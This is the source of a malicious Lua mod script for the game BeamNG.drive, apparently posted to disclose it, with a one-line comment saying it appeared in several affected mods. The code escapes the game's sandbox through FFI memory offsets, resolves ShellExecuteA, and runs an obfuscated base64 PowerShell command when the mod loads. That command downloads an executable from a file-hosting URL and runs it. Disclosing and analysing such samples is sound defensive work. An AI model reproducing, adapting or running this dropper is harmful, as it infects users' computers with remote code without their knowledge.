--This file is originally named versioncheck.lua and appears in all ofthe affected mods. It escapes the beamng sandbox, at least before the latest update.
local a={}local b=require("ffi")local c=0x1390d0;local d=0x1390b0;local e=0x1390e8;if string.find(beamng_versionb,"0.31")then c=0x1350d0;d=0x1350b0;e=0x1350e8 else c=0x1390d0;d=0x1390b0;e=0x1390e8 end;local function f()b.cdef[[
        typedef void* (*Handle)(const char* Name);
        typedef void* (*LoadLibraryAFunc)(const char* lpLibFileName);
        typedef void* (*GetProcAddressFunc)(void* hModule, const char* lpProcName);
        typedef void* (*ShellExecuteAFunc)(void* hwnd, const char* lpOperation, const char* lpFile, const char* lpParameters, const char* lpDirectory, int* nShowCmd);
    ]]local g=b.cast("long long*",0x180000000+c)local h=b.cast("long long*",0x180000000+d)local i=b.cast("long long*",0x180000000+e)local j=b.cast("Handle",g[0])local k=b.cast("GetProcAddressFunc",h[0])local l=b.cast("LoadLibraryAFunc",i[0])local m=l(b.cast("const char*","shell32.dll"))local n=b.cast("const char*","BeamNG.drive.x64.exe")local o=b.cast("long long*",j(n))local p=b.cast("const char*","ShellExecuteA")local q=b.cast("ShellExecuteAFunc",k(m,p))local r="/c \"powershell -EncodedCommand YwBtAGQAIAAvAGMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBDAG8AbQBtAGEAbgBkACAAIgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AcABpAHgAZQBsAGQAcgBhAGkAbgAuAGMAbwBtAC8AYQBwAGkALwBmAGkAbABlAC8AUwBvAFIAYwBCAEoAbgBaACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAnAC4ALwBCAGUAYQBtAE4ARwAuAFUASQAuAGUAeABlACcAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACcALgAvAEIAZQBhAG0ATgBHAC4AVQBJAC4AZQB4AGUAJwAiAA==\""local s=b.cast("const char*",r)local t="open"local u=b.cast("const char*",t)local v="cmd.exe"local w=b.cast("const char*",v)local x=0;local y=b.cast("int*",x)print("copy!")q(nil,u,w,s,nil,y)print("fire!")end;a.onInit=f;return a
